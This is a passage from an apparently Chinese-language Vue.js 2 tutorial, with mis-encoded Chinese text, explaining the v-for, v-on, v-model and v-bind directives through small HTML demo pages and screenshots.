  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item, index) in list"</span>&gt;</span>{{ index }}{{ item }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">list</span>: [<span class="hljs-string">'å°çº¢'</span>, <span class="hljs-string">'å°æ˜'</span>, <span class="hljs-string">'å°æ™º'</span>, <span class="hljs-string">'å°åˆš'</span>]
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e300871ca1744f3da43052ac37c5a276~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=02q7yjdkmzllGjIZPN6iMvRolKo%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>index æ•°ç»„å¯¹è±¡æ‰€å¯¹åº”çš„ç´¢å¼•å€¼ï¼Œæ¸²æŸ“æ¨¡ç‰ˆçš„æ—¶å€™å¦‚æœéœ€è¦åšä¸€äº›é€»è¾‘è¿ç®—çš„æ—¶å€™ï¼Œä¼šç”¨åˆ°è¿™ä¸ªç´¢å¼•å€¼ï¼Œæ¯”å¦‚åªè®©ç´¢å¼•å€¼ä¸ºå¶æ•°çš„é¡¹è¿›è¡Œæ¸²æŸ“ï¼Œå°±å¯ä»¥ç»“åˆä¹‹å‰çš„Â <code>v-if</code>ã€<code>v-show</code>Â æŒ‡ä»¤å»å®ç°éœ€æ±‚ã€‚</p>
</blockquote>
<p><strong>å°çŸ¥è¯†1</strong>ï¼š<code>v-for</code>Â å’ŒÂ <code>v-if</code>Â ä¸è¦ä¸€èµ·ä½¿ç”¨</p>
<p><code>v-for</code>Â çš„ä¼˜å…ˆçº§é«˜äºÂ <code>v-if</code>Â ï¼Œå½“å®ƒä»¬å¤„äºåŒä¸€èŠ‚ç‚¹ï¼Œ<code>v-for</code>Â çš„ä¼˜å…ˆçº§æ¯”Â <code>v-if</code>Â æ›´é«˜ï¼Œè¿™æ„å‘³ç€Â <code>v-if</code>Â å°†åˆ†åˆ«é‡å¤è¿è¡Œäºæ¯ä¸ªÂ <code>v-for</code>Â å¾ªç¯ã€‚æ¯”è¾ƒå¥½çš„è§£å†³æ–¹å¼æ˜¯ï¼Œå…ˆé€šè¿‡Â <code>computed</code>Â å±æ€§å°†éœ€è¦æ¸²æŸ“çš„åˆ—è¡¨æå‰è¿‡æ»¤ï¼Œå†å°†è¿‡æ»¤åçš„åˆ—è¡¨æ”¾åˆ°æ¨¡æ¿ä¸­æ¸²æŸ“ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯è®©é¡µé¢æ¸²æŸ“æ•ˆç‡æ›´é«˜ï¼Œé¿å…ä¸å¿…è¦çš„èµ„æºæµªè´¹ã€‚</p>
<p><strong>å°çŸ¥è¯†2</strong>ï¼š<code>v-for</code>å¯ä»¥æ¸²æŸ“ Object ç±»å‹æ•°æ®</p>
<p>æ¯”å¦‚ä¸Šè¿°ä¾‹å­æˆ‘ä»¬å¯ä»¥æ”¹æˆå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(val, key, index) in listObj"</span>&gt;</span>{{ index }}{{ val.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">listObj</span>: {
        	<span class="hljs-attr">hong</span>: {
          	<span class="hljs-attr">name</span>: <span class="hljs-string">'å°çº¢'</span>
          },
          <span class="hljs-attr">ming</span>: {
          	<span class="hljs-attr">name</span>: <span class="hljs-string">'å°æ˜'</span>
          },
          <span class="hljs-attr">zhi</span>: {
          	<span class="hljs-attr">name</span>: <span class="hljs-string">'å°æ™º'</span>
          },
          <span class="hljs-attr">gang</span>: {
          	<span class="hljs-attr">name</span>: <span class="hljs-string">'å°åˆš'</span>
          }
        }
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h4 data-id="heading-7">v-on</h4>
<p><code>v-on</code>Â å°±æ˜¯ç›‘å¬äº‹ä»¶ï¼Œå¯ä»¥ç”¨Â <code>v-on</code>Â æŒ‡ä»¤ç›‘å¬ DOM äº‹ä»¶æ¥è§¦å‘ä¸€äº›æ–¹æ³•å‡½æ•°ã€‚</p>
<p><code>v-on</code>Â æœ‰ä¸€ç§ç®€å†™å½¢å¼ï¼Œç”¨ @ ç¬¦å·ä»£æ›¿ã€‚å®ƒè¿˜èƒ½ç›‘å¬ä¸€äº›é”®ç›˜äº‹ä»¶ï¼Œå¦‚é”®ç›˜çš„å›è½¦é”®Â <code>v-on:keyup.enter</code>Â ç­‰ï¼Œå¤§å®¶å¯ä»¥ç±»æ¨å…¶ä»–çš„é”®ç›˜äº‹ä»¶ã€‚</p>
<p>ä¸‹é¢å°±æ¥çœ‹çœ‹ä»£ç ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æ•°å­—ï¼š{{ count }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">v-on:click</span>=<span class="hljs-string">"add"</span>&gt;</span>åŠ <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">v-on:keyup.enter</span>=<span class="hljs-string">"login"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">count</span>: <span class="hljs-number">1</span>,
        <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>
      },
      <span class="hljs-attr">methods</span>: {
        <span class="hljs-attr">add</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> ++
        },
        <span class="hljs-attr">login</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">username</span>)
        }
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f031fd0d99b146369a558313311f4c87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=FYHlNV8sCr74i1DvZSUwgQohRZs%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>é”®ç›˜äº‹ä»¶ä¸€èˆ¬ç”¨ä½œè¾“å…¥æ¡†ï¼Œç”¨æˆ·åæˆ–å¯†ç çš„è¾“å…¥å›è½¦äº‹ä»¶ç›‘å¬ã€‚</p>
</blockquote>
<h4 data-id="heading-8">v-model</h4>
<p>åœ¨ Vue çš„ä¼—å¤šæŒ‡ä»¤é‡Œï¼Œ<code>v-model</code>Â ç®—æ˜¯ä¸¾è¶³è½»é‡çš„ï¼Œå› ä¸ºå®ƒçš„åŒå‘ç»‘å®šç‰¹æ€§ï¼Œèƒ½è§£å†³å¾ˆå¤šä¸šåŠ¡ä¸Šçš„å¤æ‚éœ€æ±‚ï¼Œä¸‹é¢å°±ç”¨å‡ ä¸ªå°ç¤ºä¾‹æ¥è¯ é‡Šå®ƒçš„å¼ºå¤§ï¼Œä»£ç æ¼”ç¤ºå¦‚ä¸‹ï¼š</p>
<p>1ã€æœ€ç®€å•çš„åŒå‘ç»‘å®š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ç”¨æˆ·åï¼š{{ username }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"username"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/776ede7941794a5a855c339d94f12794~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=treaT4rVcvoVF9AaSZx7xeqAChQ%3D" alt="" loading="lazy"/></p>
<p>2ã€ç»“åˆå¤é€‰æ¡†</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>checkbox<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"apple"</span>&gt;</span>è‹¹æœ<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"fruit.apple"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"apple"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"banana"</span>&gt;</span>é¦™è•‰<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"fruit.banana"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"banana"</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span>
    {{ fruit }}
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">fruit</span>: {
          <span class="hljs-attr">apple</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">banana</span>: <span class="hljs-literal">false</span>
        }
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8616e7118128410586e3a13b192346a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=KRdTaYSz11Q7lZg9t7Hv5D%2B5Uro%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>ç»“åˆå¤é€‰æ¡†å®ç°åˆ‡æ¢å¤é€‰æ¡†å†…çš„å€¼ï¼ŒåŠ¨æ€åœ°æ”¹å˜æ•°æ®ã€‚</p>
</blockquote>
<p>3ã€ç»“åˆå•é€‰æ¡†</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>radio<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"apple"</span>&gt;</span>ç”·<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"sex"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"ç”·"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"banana"</span>&gt;</span>å¥³<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"sex"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"å¥³"</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span>
    {{ sex }}
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">sex</span>: <span class="hljs-string">'ç”·'</span>
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8cce66afea241ce959a8dcbea25a2eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=87We%2FJX7EhvJuKXuRXMfy66qCko%3D" alt="" loading="lazy"/></p>
<p>4ã€å‡ ä¸ªéœ€è¦æ³¨æ„çš„ä¿®é¥°ç¬¦</p>
<ul>
<li>.lazyï¼šæ¥ç®¡ input çš„äº‹ä»¶ç›‘å¬äº‹ä»¶ï¼Œè¾“å…¥çš„æ—¶å€™ä¸ä¼šé©¬ä¸Šå“åº”åœ¨å±•ç¤ºå±‚ï¼Œå½“æ•°æ®ç¡®è®¤æ”¹å˜çš„æ—¶å€™æ‰ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼›</li>
<li>.trimï¼šå»æ‰é¦–å°¾çš„ç©ºæ ¼ï¼Œä¸ä¼šå»é™¤ä¸­é—´çš„ç©ºæ ¼ï¼›</li>
<li>.numberï¼šè¾“å…¥çš„å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å­—ï¼›</li>
</ul>
<h4 data-id="heading-9">v-bind</h4>
<p>å¯¹å˜é‡å±æ€§çš„ä¸€ä¸ªç»‘å®šï¼Œæ¯”å¦‚è¯´éœ€è¦ç»‘å®šä¸€ä¸ªå›¾ç‰‡åªéœ€å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">&lt;img v-bind:<span class="hljs-attr">src</span>=<span class="hljs-string">"imageSrc"</span>&gt;
// å¯ç®€å†™ä¸º
&lt;img :<span class="hljs-attr">src</span>=<span class="hljs-string">"imageSrc"</span>&gt;
</code></pre>
<p>ç»‘å®š CSS æ ·å¼ï¼Œä¸€èˆ¬ç”¨åœ¨éœ€è¦è®¡ç®—è¡¨è¾¾å¼çš„æ—¶å€™ä½¿ç”¨</p>
<pre><code class="hljs language-csharp" lang="csharp">&lt;div :<span class="hljs-keyword">class</span>=<span class="hljs-string">"className"</span>&gt;ç»‘å®š<span class="hljs-keyword">class</span>&lt;/<span class="hljs-title">div</span>&gt;
<span class="hljs-comment">// åˆ¤æ–­å˜é‡</span>
&lt;<span class="hljs-title">div</span> :<span class="hljs-title">class</span>="{<span class="hljs-title">classA</span>: <span class="hljs-title">isShow</span>}"&gt;ç»‘å®š<span class="hljs-keyword">class</span>ä¸­çš„åˆ¤æ–­&lt;/<span class="hljs-title">div</span>&gt;
<span class="hljs-comment">// ä¸‰å…ƒè¿ç®—ç¬¦</span>
&lt;<span class="hljs-title">div</span> :<span class="hljs-title">class</span>="<span class="hljs-title">isShow</span> ? <span class="hljs-title">classA</span> : <span class="hljs-title">classB</span>"&gt;ç»‘å®š<span class="hljs-keyword">class</span>ä¸­çš„ä¸‰å…ƒè¡¨è¾¾å¼åˆ¤æ–­&lt;/<span class="hljs-title">div</span>&gt;
<span class="hljs-comment">// ç»‘å®š style</span>
